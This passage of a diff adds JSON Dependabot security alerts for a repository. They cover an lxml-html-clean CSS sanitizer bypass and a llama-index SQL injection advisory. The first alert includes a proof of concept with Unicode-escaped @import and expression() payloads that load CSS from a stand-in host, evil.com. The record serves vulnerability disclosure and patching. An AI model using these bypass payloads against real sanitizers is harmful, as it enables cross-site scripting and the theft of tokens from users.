+            "summary": "lxml-html-clean has CSS @import Filter Bypass via Unicode Escapes",
+            "description": "### Summary\nThe `_has_sneaky_javascript()` method strips backslashes before checking for dangerous CSS keywords. This causes CSS Unicode escape sequences to bypass the `@import` and `expression()` filters, allowing external CSS loading or XSS in older browsers.\n\n### Details\nThe root cause is located in `clean.py` (around line 594):\n```python\nstyle = style.replace('\\\\', '')\n```\nThis transformation changes a payload like `@\\69mport` into `@69mport`. This resulting string does NOT match the blacklist keyword `@import`. However, all modern browsers' CSS parsers decode `\\69` as the character 'i' (hex 69) according to CSS spec section 4.3.7, interpreting `@\\69mport` as a valid `@import` statement.\n\nSame root cause bypasses `expression()` detection: `\\65xpression(alert(1))` passes through (IE only).\n\n### PoC\n```python\nfrom lxml_html_clean import clean_html\n\n# Normal @import is correctly blocked:\n# clean_html('<style>@import url(\"http://evil.com/x.css\");</style>')\n# Output: <div><style> url(\"http://evil.com/x.css\");</style></div>\n\n# Unicode escape bypass:\nresult = clean_html('<style>@\\\\69mport url(\"http://evil.com/x.css\");</style>')\nprint(result)\n# Output: <div><style>@\\69mport url(\"http://evil.com/x.css\");</style></div>\n```\nIf rendered in a browser, the browser loads the external CSS. Variants like `@\\0069mport`, `@\\69 mport` (trailing space), and `@\\49mport` (uppercase I) also work.\n\n### Impact\nExternal CSS loading enables data exfiltration via attribute selectors (e.g., reading CSRF tokens), UI redressing, and phishing. In older browsers (IE), this allows for full XSS via `expression()`.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-hw26-mmpg-fqfg",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-28348",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-hw26-mmpg-fqfg"
+                },
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/commit/2ef732667ddbc74ea59847bcf24b75809aaeed3b"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28348"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-hw26-mmpg-fqfg"
+                }
+            ],
+            "published_at": "2026-03-02T19:19:15Z",
+            "updated_at": "2026-03-05T22:49:21Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "lxml-html-clean"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 0.4.3",
+                    "first_patched_version": {
+                        "identifier": "0.4.4"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                    "score": 6.1
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00228,
+                "percentile": 0.13565
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                "score": 6.1
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-116",
+                    "name": "Improper Encoding or Escaping of Output"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 0.4.3",
+            "first_patched_version": {
+                "identifier": "0.4.4"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/137",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/137",
+        "created_at": "2026-03-03T12:01:37Z",
+        "updated_at": "2026-08-16T01:17:15Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 50,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "llama-index"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-v3c8-3pr6-gr7p",
+            "cve_id": "CVE-2025-1793",
+            "summary": "llama_index vulnerable to SQL Injection",
+            "description": "Multiple vector store integrations in run-llama/llama_index version v0.12.21 have SQL injection vulnerabilities. These vulnerabilities allow an attacker to read and write data using SQL, potentially leading to unauthorized access to data of other users depending on the usage of the llama-index library in a web application.",
+            "severity": "critical",
+            "identifiers": [
+                {
+                    "value": "GHSA-v3c8-3pr6-gr7p",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2025-1793",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-1793"
+                },
+                {
+                    "url": "https://github.com/run-llama/llama_index/commit/0008041e8dde8e519621388e5d6f558bde6ef42e"
+                },
+                {
+                    "url": "https://huntr.com/bounties/8cb1555a-9655-4122-b0d6-60059e79183c"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-v3c8-3pr6-gr7p"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/llama-index/PYSEC-2026-394.yaml"
+                },
+                {
+                    "url": "https://github.com/run-llama/llama_index"
+                },
+                {
+                    "url": "https://pypi.org/project/llama-index"
+                }
+            ],
+            "published_at": "2025-06-05T06:30:26Z",
+            "updated_at": "2026-07-21T15:32:48Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "llama-index"
+                    },
+                    "severity": "critical",
+                    "vulnerable_version_range": "< 0.12.28",
+                    "first_patched_version": {
+                        "identifier": "0.12.28"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                    "score": 9.8
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00581,
+                "percentile": 0.44521
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "score": 9.8
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-89",
+                    "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "llama-index"
+            },
+            "severity": "critical",
+            "vulnerable_version_range": "< 0.12.28",
+            "first_patched_version": {
+                "identifier": "0.12.28"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/50",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/50",
+        "created_at": "2025-06-06T17:46:28Z",
+        "updated_at": "2025-06-06T17:46:28Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    }
+]
